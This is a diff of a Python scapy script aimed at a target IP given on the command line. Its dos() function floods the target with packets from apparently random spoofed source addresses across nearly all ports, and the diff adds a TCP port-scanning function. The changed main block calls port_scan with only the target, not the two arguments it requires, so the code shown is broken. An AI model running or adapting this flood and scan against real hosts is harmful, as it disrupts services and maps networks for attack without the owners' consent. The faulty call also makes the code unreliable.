@@ -2,13 +2,13 @@ import random
 import sys
 from scapy import sendrecv
 from scapy.layers import inet
+import common_port
+import time
 
 
 def dos(target_ip):
-    count = 0
     port_list = [i for i in range(1, 65535)]
     while True:
-        count += 1
         a = str(random.randint(1, 254))
         b = str(random.randint(1, 254))
         c = str(random.randint(1, 254))
@@ -24,7 +24,24 @@ def dos(target_ip):
             sendrecv.send(pkt, inter=0.001)
 
 
+def port_scan(time_out, target_ip, port_list=None):
+    a = inet.IP(dst=target_ip)
+    _expose_port = []
+    _start = time.time()
+    if port_list is None:
+        port_list = common_port.port_list_top_1000
+    for port in port_list:
+        pkt = a / inet.TCP(dport=port)
+        ans = sendrecv.sr1(pkt, timeout=2)
+        if ans is not None:
+            _expose_port.append(port)
+        if _expose_port.__len__() == port_list.__len__(
+        ) or time.time() - _start > time_out:
+            return _expose_port
+
 
 if __name__ == '__main__':
     target = sys.argv[1]
-    dos(target)
+    # dos(target)
+
+    port_scan(target)
